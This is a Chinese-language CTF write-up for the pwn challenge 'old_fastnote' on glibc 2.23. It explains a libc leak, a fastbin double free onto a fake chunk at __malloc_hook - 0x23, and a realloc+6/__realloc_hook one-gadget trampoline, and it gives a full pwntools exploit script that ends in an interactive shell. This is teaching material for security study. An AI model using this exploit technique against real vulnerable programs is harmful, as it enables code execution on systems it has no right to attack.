# old_fastnote

## 题目简述

程序使用 glibc 2.23，可在 fastbin 中构造 double free。glibc 会检查伪造目标附近的 size 字段，不能把 freelist 直接指向任意地址；经典做法是把目标设为 `__malloc_hook - 0x23`，利用其前方恰好可被解释为合法 fastbin size 的字节，获得覆盖 `__realloc_hook` 和 `__malloc_hook` 的重叠块。

## 解题过程

### 泄露 libc

申请一个 `0x80` 请求块和隔离块，释放大块后查看其 unsorted bin 指针。官方 glibc 2.23 的泄露偏移为 `0x3c4b78`。

### fastbin double free

申请两个 `0x60` 请求块，按 `A、B、A` 释放。再次申请时，将 freelist 指针写为 `__malloc_hook - 0x23`；经过两次占位分配后，下一块的数据区会落在 hooks 前方。

直接把 one-gadget 写入 `__malloc_hook` 时，调用现场不满足约束。题解采用更稳定的跳板：

1. 将 one-gadget 写入 `__realloc_hook`；
2. 将 `realloc + 6` 写入 `__malloc_hook`；
3. 下一次 `malloc` 先跳到 `realloc + 6`，由 realloc 的函数序言调整栈，再经 `__realloc_hook` 进入 one-gadget。

```python
from pwn import ELF, p64, u64

libc = ELF("./libc-2.23.so")

# add(index, size, content)、delete(index)、show(index)
# 是题目菜单封装。

add(0, 0x80, b"a" * 8)
add(1, 0x10, b"gap")
delete(0)
show(0)

arena_pointer = u64(io.recv(6).ljust(8, b"\x00"))
libc.address = arena_pointer - 0x3C4B78

malloc_hook = libc.sym["__malloc_hook"]
realloc = libc.sym["realloc"]
one_gadget = libc.address + 0xF1247

add(2, 0x60, b"aaaa")
add(3, 0x60, b"bbbb")
add(4, 0x10, b"gap")

delete(2)
delete(3)
delete(2)

add(5, 0x60, p64(malloc_hook - 0x23))
add(6, 0x60, b"padding")
add(7, 0x60, b"padding")

# 返回位置是 __malloc_hook - 0x13：
# +0x0b 对应 __realloc_hook，+0x13 对应 __malloc_hook。
payload = b"A" * 3
payload += p64(0)
payload += p64(one_gadget)
payload += p64(realloc + 6)
add(8, 0x60, payload)

# 任意触发一次 malloc。
add(9, 0x60, b"trigger")
io.interactive()
```

one-gadget `0xf1247` 的约束要求 `[rsp + 0x70] == NULL`。使用 `realloc + 6` 作为中转入口，是为了借助其栈帧调整满足该约束，而不是一个可随意替换的固定偏移。

## 方法总结

- 核心技巧：glibc 2.23 fastbin double free、`__malloc_hook - 0x23` 伪块，以及 `realloc + 6 → __realloc_hook → one_gadget` 跳板。
- 识别信号：旧版 glibc、可重复释放、目标附近需要伪造合法 size，且直接 one-gadget 约束不满足。
- 复用要点：hook 相对位置和 one-gadget 约束必须用当前 libc 验证；固定偏移不能跨版本照搬。
